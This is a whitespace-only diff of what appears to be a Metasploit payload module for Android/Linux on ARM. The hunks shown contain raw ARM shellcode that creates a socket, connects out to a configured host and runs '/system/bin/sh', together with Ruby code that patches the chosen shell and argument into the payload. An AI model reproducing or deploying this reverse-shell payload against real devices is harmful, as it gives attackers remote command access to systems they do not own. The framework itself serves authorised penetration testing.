@@ -47,9 +47,9 @@ module Metasploit3
 							# Linux version 2.6.27-00110-g132305e armv5l
 							# Linux version 2.6.29-00177-g24ee4d2 armv5l
 							# Linux version 2.6.29-00255-g7ca5167 armv5l
-							# 
+							#
 							# Probably requires process to have INTERNET permission
-							# or root. 
+							# or root.
 							####
 							# socket(2,1,6)
 							0xe3a00002,       # mov     r0, #2  ; 0x2
@@ -58,8 +58,8 @@ module Metasploit3
 							0xe3a0708c,       # mov     r7, #140        ; 0x8c
 							0xe287708d,       # add     r7, r7, #141    ; 0x8d
 							0xef000000,       # svc     0x00000000
-							
-							# connect(soc, socaddr, 0x10)	
+
+							# connect(soc, socaddr, 0x10)
 							0xe1a06000,       # mov     r6, r0
 							0xe28f1084,       # 1dr     r1, pc, #132  ; 0x84
 							0xe3a02010,       # mov     r2, #16 ; 0x10
@@ -86,7 +86,7 @@ module Metasploit3
 							0xef000000,       # svc     0x00000000
 
 							# execve("/system/bin/sh", args, env)
-							# Shrink me here. I am lame. 
+							# Shrink me here. I am lame.
 							0xe28f0048,       # add     r0, pc, #72     ; 0x48
 							0xe0244004,       # eor     r4, r4, r4
 							0xe92d0010,       # push    {r4}
@@ -131,16 +131,16 @@ module Metasploit3
 				OptString.new('SHELLARG', [ false, "The argument to pass to the shell.", "-C" ])
 			], self.class)
 	end
-	
+
 	def generate
 		p = super
-		
+
 		sh = datastore['SHELL']
 		if sh.length >= 16
 			raise ArgumentError, "The specified shell must be less than 16 bytes."
 		end
 		p[176, sh.length] = sh
-		
+
 		arg = datastore['SHELLARG']
 		if arg
 			if arg.length >= 4
